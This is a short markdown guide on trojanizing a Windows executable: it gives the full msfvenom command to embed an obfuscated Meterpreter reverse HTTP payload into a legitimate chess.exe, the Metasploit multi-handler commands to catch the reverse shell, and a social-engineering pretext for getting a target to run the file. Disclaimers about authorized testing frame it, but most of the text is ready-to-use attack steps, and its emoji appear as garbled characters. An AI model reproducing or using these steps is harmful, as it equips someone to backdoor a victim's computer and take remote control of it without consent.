# ğŸ§¨ Creating Malicious File with Msfvenom

This guide demonstrates how to embed a Meterpreter reverse HTTP payload into a Windows `.exe` file using `msfvenom`, then set up a Metasploit multi-handler to receive the reverse shell. This method is commonly used in red team labs and ethical hacking environments.

âš ï¸ WARNING: This guide is for educational and authorized penetration testing purposes only. Never use these techniques on systems without explicit permission.

---

## ğŸ“¦ Requirements

- Kali Linux or any OS with:
  - `msfvenom`
  - `metasploit-framework`
- A legitimate 32-bit Windows executable (e.g., `chess.exe`)
- Your IP address on the local network (e.g., `192.168.0.114`)

---

## ğŸš€ Step 1: Create Malicious Payload

We will embed the payload into a legitimate `chess.exe` file and encode it using the `shikata_ga_nai` encoder for basic obfuscation.

```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.0.114 LPORT=80 \
-x /root/chess.exe -e x86/shikata_ga_nai -i 10 -f exe -o newchess.exe
```

### Payload Breakdown

- `-p windows/meterpreter/reverse_http`: 32-bit reverse HTTP Meterpreter payload  
- `LHOST`: Attacker's IP address  
- `LPORT`: Port to listen on  
- `-x /root/chess.exe`: Template legitimate executable  
- `-e x86/shikata_ga_nai`: Encoder to obfuscate payload  
- `-i 10`: Encode 10 times  
- `-f exe`: Output format  
- `-o newchess.exe`: Output file name  

After execution, `newchess.exe` will be generated. This file, when executed by the target, will initiate a reverse connection to your system.

---

## ğŸ“¡ Step 2: Start Metasploit Multi-Handler

Now we need to configure the listener on your Kali system to wait for the incoming connection.

```bash
msfconsole
```

Inside the Metasploit console:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_http
set LHOST 192.168.0.114
set LPORT 80
exploit
```

âš ï¸ Ensure that:
- The `PAYLOAD` matches exactly the one used in `msfvenom`.
- You do not mix architectures (e.g., x86 vs x64).

---

## ğŸ­ Social Engineering Delivery

Disguise the payload and use a basic pretext like:

> â€œHey! Letâ€™s play this cool new 3D chess game I found.â€

Send `newchess.exe` to the target using a USB drive, file-sharing service, or any method approved in your test environment.

---

## ğŸ–¥ï¸ Result

Once the target runs the file:
- A Meterpreter session will be initiated
- Youâ€™ll have control over the victim system

---

## âš–ï¸ Legal Disclaimer

This guide is strictly for ethical hacking, research, and authorized security testing. Unauthorized access to systems is illegal. Always operate under a legal agreement or contract.
